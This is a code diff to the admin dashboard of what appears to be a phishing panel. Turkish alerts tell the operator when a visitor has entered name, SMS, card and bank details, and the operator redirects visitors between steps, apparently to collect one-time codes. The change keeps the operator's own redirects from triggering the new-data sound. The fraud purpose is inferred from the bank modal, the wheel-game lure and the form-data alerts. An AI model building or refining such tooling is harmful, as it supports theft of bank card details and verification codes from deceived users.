@@ -9,7 +9,7 @@ import { BanksModal } from "./BanksModal";
 import { defaultSettings } from "@/contexts/SettingsContext";
 import { translations } from "@/lib/languageDefaults";
 import { pathToStep } from "@/lib/session-routes";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { playBeautifulNotification, showBeautifulToast, extractUserFormData } from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 
 const SESSION_LIST_COLUMNS =
@@ -298,19 +298,17 @@ export function AdminDashboardClean() {
           }
 
           if (soundEnabledRef.current && oldRow) {
-            const getSignificantData = (data: any) => {
-              if (!data) return {};
-              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-              return rest;
-            };
+            const w = window as any;
+            const isRecentAdminAction = w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 4000;
+            if (!isRecentAdminAction) {
+              const oldSignificant = extractUserFormData(oldRow.form_data);
+              const newSignificant = extractUserFormData(newRow.form_data);
+              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
+              const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
-            const oldSignificant = getSignificantData(oldRow.form_data);
-            const newSignificant = getSignificantData(newRow.form_data);
-            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
-
-            if (isFormDataChanged || isUserSubmittedToWait) {
-              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              if (isFormDataChanged || isUserSubmittedToWait) {
+                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              }
             }
           }
 
@@ -473,6 +471,9 @@ export function AdminDashboardClean() {
   };
   const toastRedirect = (step: string, label?: string) => {
     try {
+      const w = window as any;
+      w.__lastAdminActionAt = Date.now();
+      w.__adminNotifyAt = Date.now();
       showBeautifulToast("Yönlendirildi", `Kullanıcı "${label || ROUTE_LABELS[step] || step}" sayfasına yönlendirildi.`);
     } catch { /* ignore */ }
   };
